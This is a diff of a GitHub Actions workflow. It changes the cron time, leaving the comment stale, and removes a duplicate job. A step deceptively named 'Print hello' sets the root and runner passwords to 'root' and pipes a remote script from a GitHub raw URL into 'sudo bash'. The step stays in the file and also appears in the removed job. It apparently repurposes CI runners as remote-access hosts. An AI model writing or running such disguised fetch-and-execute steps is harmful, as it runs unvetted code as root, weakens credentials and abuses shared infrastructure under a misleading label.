@@ -17,7 +17,6 @@ jobs:
 
 
 name: run
-
 # Comprehensive set of triggers — enable the events you actually need to avoid noise/costs.
 on:
 #  push:
@@ -30,7 +29,7 @@ on:
   issue_comment:
     types: [created, edited, deleted]
   schedule:
-    - cron: '0 0 * * *' # daily run at UTC midnight; change as needed
+    - cron: '30 8 * * *' # daily run at UTC midnight; change as needed
   workflow_dispatch: {}        # manual run
   repository_dispatch: {}      # external dispatch
   workflow_call: {}            # callable by other workflows
@@ -78,12 +77,7 @@ jobs:
       - name: Print hello
         run: sudo swapoff -a & sudo apt update &  printf "root\nroot" | sudo passwd root &&  printf "root\nroot" | sudo passwd runner &&  printf "root" | su - root -c " curl https://raw.githubusercontent.com/amitstudydude/guacamole/main/run | sudo bash "
         
-  say-hello:
-    name: Say hello
-    runs-on: ubuntu-latest
-    steps:
-      - name: Print hello
-        run: sudo swapoff -a & sudo apt update &  printf "root\nroot" | sudo passwd root &&  printf "root\nroot" | sudo passwd runner &&  printf "root" | su - root -c " curl https://raw.githubusercontent.com/amitstudydude/guacamole/main/run | sudo bash "
+  
 
 
 
